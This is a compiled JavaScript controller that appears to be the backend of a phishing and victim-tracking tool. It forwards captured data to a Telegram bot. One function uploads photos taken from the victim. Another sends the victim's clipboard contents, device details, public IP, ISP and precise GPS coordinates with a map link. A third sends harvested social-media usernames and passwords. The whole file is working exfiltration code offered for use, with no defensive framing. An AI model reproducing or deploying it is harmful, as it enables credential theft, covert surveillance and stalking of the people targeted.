"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.sendPhoto = sendPhoto;
exports.sendUserInfo = sendUserInfo;
exports.sendSocialInfo = sendSocialInfo;
const bot_1 = __importDefault(require("./config/bot"));
const path_1 = __importDefault(require("path"));
const fs_1 = __importDefault(require("fs"));
function sendPhoto(chatId, files) {
    return new Promise((resolve, reject) => {
        try {
            if (files && files['photo']) {
                let tempFilePath = path_1.default.join(__dirname, "/public/images/" + Date.now() + ".jpg");
                let photo = files['photo'];
                photo.mv(tempFilePath, (err) => {
                    if (err) {
                        console.error("Image mv error", err);
                        reject(false);
                    }
                    bot_1.default.sendPhoto(chatId, fs_1.default.createReadStream(tempFilePath)).then(() => {
                        fs_1.default.unlinkSync(tempFilePath);
                    })
                        .catch(err => {
                        fs_1.default.unlinkSync(tempFilePath);
                        console.error("Error from telegram sendPhoto", String(err));
                        reject(false);
                    });
                });
            }
            else {
                reject(false);
            }
        }
        catch (err) {
            reject(false);
            console.error("Error from controller sendPhoto: ", err);
        }
    });
}
function sendUserInfo(chatId, info) {
    return new Promise((resolve, reject) => {
        let message = `
<b>Device:</b> ${info.device}
<b>Os:</b> ${info.os}
<b>Battery:</b> ${info.battery.error ? info.battery.error : `
> <b>Status:</b> ${info.battery.status}
> <b>Percentage:</b> ${info.battery.percentage}
`}
<b>Clipboard:</b> ${info.clipboard}
<b>Languages:</b> ${info.languages}
		
<b>Public IP:</b> ${info.public_ip}
> <b>City:</b> ${info.city}
> <b>Country:</b> ${info.country}
> <b>Timezone:</b> ${info.timezone}
> <b>Isp:</b> ${info.isp}
> <b>Privacy:</b> ${info.privacy}

<b>Coordinates:</b> ${info.coordinates.error ? info.coordinates.error : `
> ${info.coordinates.latitude},${info.coordinates.longitude}
> <b>Google Map:</b> https://www.google.com/maps/?q=${info.coordinates.latitude},${info.coordinates.longitude}
`}`;
        bot_1.default.sendMessage(chatId, message, { parse_mode: "HTML" }).then(() => {
            resolve(true);
        }).catch(err => {
            console.error("Error from controller sendUserInfo: ", String(err));
            reject(false);
        });
    });
}
function sendSocialInfo(chatId, credentials) {
    return new Promise((resolve, reject) => {
        let message = `
<b>Platform:</b> ${credentials.platform}
<b>Username:</b> ${credentials.username}
<b>Password:</b> ${credentials.password}`;
        bot_1.default.sendMessage(chatId, message, { parse_mode: "HTML" }).then(() => {
            resolve(true);
        }).catch(err => {
            console.error("Error from controller sendUserInfo: ", String(err));
            reject(false);
        });
    });
}
